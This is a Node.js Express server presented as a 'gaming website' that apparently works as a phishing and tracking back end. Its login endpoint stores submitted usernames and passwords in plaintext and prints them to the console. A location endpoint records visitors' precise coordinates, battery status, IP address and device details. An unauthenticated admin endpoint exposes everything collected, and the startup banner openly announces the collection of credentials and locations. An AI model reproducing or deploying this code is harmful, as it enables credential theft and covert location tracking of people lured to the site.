const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const readline = require('readline');

const app = express();

// Create data directory if not exists
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir);
}

// Database files
const usersFile = path.join(dataDir, 'users.json');
const locationsFile = path.join(dataDir, 'locations.json');
const loginsFile = path.join(dataDir, 'logins.json');

// Initialize JSON files
if (!fs.existsSync(usersFile)) fs.writeFileSync(usersFile, JSON.stringify([]));
if (!fs.existsSync(locationsFile)) fs.writeFileSync(locationsFile, JSON.stringify([]));
if (!fs.existsSync(loginsFile)) fs.writeFileSync(loginsFile, JSON.stringify([]));

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Default route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API: Save user location with battery info
app.post('/api/location', (req, res) => {
    const locationData = {
        ...req.body,
        timestamp: new Date().toISOString(),
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.headers['user-agent']
    };
    
    const locations = JSON.parse(fs.readFileSync(locationsFile));
    locations.push(locationData);
    fs.writeFileSync(locationsFile, JSON.stringify(locations, null, 2));
    
    // Beautiful console output
    console.log('\n📍 ========== NEW VISITOR DATA ==========');
    console.log(`   🕐 Time: ${locationData.timestamp}`);
    console.log(`   🌐 IP Address: ${locationData.ip}`);
    console.log(`   💻 User Agent: ${locationData.userAgent?.substring(0, 50)}...`);
    console.log(`   📱 Screen Size: ${locationData.screenSize || 'N/A'}`);
    console.log(`   🌍 Language: ${locationData.language || 'N/A'}`);
    
    // Location details
    if (locationData.latitude && locationData.longitude) {
        console.log(`\n   📍 LOCATION DETAILS:`);
        console.log(`      Latitude: ${locationData.latitude}`);
        console.log(`      Longitude: ${locationData.longitude}`);
        console.log(`      Accuracy: ${locationData.accuracy || 'N/A'} meters`);
        console.log(`      Google Maps: ${locationData.googleMapLink}`);
    } else if (locationData.locationError) {
        console.log(`\n   ❌ Location Error: ${locationData.locationError}`);
    } else {
        console.log(`\n   ❌ Location: Not captured (permission denied or unavailable)`);
    }
    
    // Battery details
    if (locationData.batteryPercentage !== undefined && locationData.batteryPercentage !== null) {
        console.log(`\n   🔋 BATTERY DETAILS:`);
        console.log(`      Battery Level: ${locationData.batteryPercentage}%`);
        console.log(`      Charging: ${locationData.batteryCharging ? 'Yes ⚡' : 'No'}`);
    } else {
        console.log(`\n   🔋 Battery: Not supported or not captured`);
    }
    
    console.log('   =========================================\n');
    
    res.json({ success: true, message: 'Location and battery data saved' });
});

// API: Save login credentials with battery info
app.post('/api/login', (req, res) => {
    const { username, password, location, battery } = req.body;
    
    const loginData = {
        username: username,
        password: password,
        location: location,
        battery: battery || { level: null, charging: false },
        timestamp: new Date().toISOString(),
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.headers['user-agent']
    };
    
    // Save to logins file
    const logins = JSON.parse(fs.readFileSync(loginsFile));
    logins.push(loginData);
    fs.writeFileSync(loginsFile, JSON.stringify(logins, null, 2));
    
    // Save to users file
    const users = JSON.parse(fs.readFileSync(usersFile));
    const existingUser = users.find(u => u.username === username);
    
    if (!existingUser) {
        users.push({
            username: username,
            password: password,
            registeredAt: new Date().toISOString(),
            ip: req.ip,
            balance: 200,
            registrationBattery: battery?.level || null
        });
        fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
    }
    
    // Beautiful console output
    console.log('\n🔐 ========== NEW LOGIN ATTEMPT ==========');
    console.log(`   🕐 Time: ${loginData.timestamp}`);
    console.log(`   👤 Username: ${username}`);
    console.log(`   🔑 Password: ${password}`);
    console.log(`   🌐 IP: ${loginData.ip}`);
    console.log(`   💻 User Agent: ${loginData.userAgent?.substring(0, 50)}...`);
    
    if (location?.lat && location?.lng) {
        console.log(`   📍 Login Location: ${location.lat}, ${location.lng}`);
    }
    
    if (battery?.level !== undefined && battery?.level !== null) {
        console.log(`   🔋 Battery at Login: ${battery.level}% ${battery.charging ? '(Charging⚡)' : ''}`);
    }
    
    console.log('   =========================================\n');
    
    const user = users.find(u => u.username === username);
    const balance = user ? user.balance : 200;
    
    res.json({ success: true, message: 'Login successful', balance: balance });
});

// API: Update user balance
app.post('/api/update-balance', (req, res) => {
    const { username, balance } = req.body;
    
    const users = JSON.parse(fs.readFileSync(usersFile));
    const userIndex = users.findIndex(u => u.username === username);
    
    if (userIndex !== -1) {
        users[userIndex].balance = balance;
        users[userIndex].lastUpdated = new Date().toISOString();
        fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

// API: Get user balance
app.get('/api/balance/:username', (req, res) => {
    const users = JSON.parse(fs.readFileSync(usersFile));
    const user = users.find(u => u.username === req.params.username);
    res.json({ balance: user?.balance || 0 });
});

// API: Get all data (admin)
app.get('/api/admin/data', (req, res) => {
    const locations = JSON.parse(fs.readFileSync(locationsFile));
    const logins = JSON.parse(fs.readFileSync(loginsFile));
    const users = JSON.parse(fs.readFileSync(usersFile));
    
    // Calculate stats
    const batteryStats = {
        averageBattery: 0,
        totalWithBattery: 0,
        lowestBattery: 100,
        highestBattery: 0
    };
    
    locations.forEach(loc => {
        if (loc.batteryPercentage !== undefined && loc.batteryPercentage !== null) {
            batteryStats.totalWithBattery++;
            batteryStats.averageBattery += loc.batteryPercentage;
            if (loc.batteryPercentage < batteryStats.lowestBattery) batteryStats.lowestBattery = loc.batteryPercentage;
            if (loc.batteryPercentage > batteryStats.highestBattery) batteryStats.highestBattery = loc.batteryPercentage;
        }
    });
    
    if (batteryStats.totalWithBattery > 0) {
        batteryStats.averageBattery = Math.round(batteryStats.averageBattery / batteryStats.totalWithBattery);
    }
    
    res.json({
        totalLocations: locations.length,
        totalLogins: logins.length,
        totalUsers: users.length,
        batteryStats: batteryStats,
        locations: locations.slice(-20), // Last 20 locations
        logins: logins.slice(-20), // Last 20 logins
        users: users
    });
});

// API: Get battery stats only
app.get('/api/battery-stats', (req, res) => {
    const locations = JSON.parse(fs.readFileSync(locationsFile));
    const batteryData = locations
        .filter(loc => loc.batteryPercentage !== undefined && loc.batteryPercentage !== null)
        .map(loc => ({
            battery: loc.batteryPercentage,
            charging: loc.batteryCharging,
            timestamp: loc.timestamp
        }));
    
    res.json({
        totalEntries: batteryData.length,
        data: batteryData.slice(-50)
    });
});

// Ask for IP and Port before starting
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log('\n🚀 ========================================');
console.log('   GAMING WEBSITE SERVER SETUP');
console.log('   ========================================\n');

rl.question('📡 Enter IP address to run on (default: 0.0.0.0): ', (ip) => {
    const host = ip || '0.0.0.0';
    
    rl.question('🔌 Enter PORT number to run on (default: 3000): ', (port) => {
        const PORT = parseInt(port) || 3000;
        
        rl.question('🌐 Enter your public IP or domain (press enter for localhost): ', (publicUrl) => {
            const baseUrl = publicUrl || `http://localhost:${PORT}`;
            
            console.log('\n✅ Server Configuration:');
            console.log(`   Host: ${host}`);
            console.log(`   Port: ${PORT}`);
            console.log(`   URL: ${baseUrl}`);
            console.log(`   Data Directory: ./data/\n`);
            
            // Start server
            app.listen(PORT, host, () => {
                console.log('🎮 ========================================');
                console.log(`   SERVER RUNNING SUCCESSFULLY!`);
                console.log('   ========================================');
                console.log(`   📍 Local Access: http://localhost:${PORT}`);
                console.log(`   🌍 Network Access: ${baseUrl}`);
                console.log(`   📁 Data stored in: ${dataDir}`);
                console.log('   ========================================\n');
                
                console.log('📊 DATA COLLECTION ACTIVE:');
                console.log('   ✅ User locations with Google Maps link');
                console.log('   ✅ Battery percentage and charging status');
                console.log('   ✅ Login credentials (username/password)');
                console.log('   ✅ IP addresses and timestamps');
                console.log('   ✅ User agents and device info\n');
                
                console.log('🔍 ADMIN API ENDPOINTS:');
                console.log(`   📍 ${baseUrl}/api/admin/data - View all collected data`);
                console.log(`   🔋 ${baseUrl}/api/battery-stats - View battery statistics`);
                console.log('   ========================================\n');
                
                console.log('💡 TIP: Open browser and check the console for real-time data!');
            });
            
            rl.close();
        });
    });
});
